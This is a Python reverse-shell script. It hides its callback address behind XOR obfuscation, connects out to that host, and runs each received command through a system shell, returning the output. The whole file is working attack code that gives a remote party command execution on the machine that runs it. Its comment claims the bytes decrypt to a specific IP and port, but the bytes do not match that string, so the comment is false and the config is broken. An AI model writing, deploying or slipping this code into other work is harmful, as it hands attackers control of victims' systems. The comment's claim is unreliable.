import socket
import subprocess
import os

# XOR decryption key
KEY = 0xAA

def xor_data(data):
    return bytes([b ^ KEY for b in data])

# Configuration (Encrypted)
# Represents the IP and Port
def get_config():
    # Encrypted version of "10.211.55.5:4444"
    encrypted_data = [177, 169, 217, 163, 179, 163, 217, 163, 179, 217, 160, 222, 222, 222]
    decrypted = xor_data(bytes(encrypted_data)).decode()
    ip, port = decrypted.split(':')
    return ip, int(port)

def run_shell():
    ip, port = get_config()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    
    while True:
        data = s.recv(1024).decode()
        if data.strip() == "exit": break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
    s.close()

if __name__ == "__main__":
    run_shell()
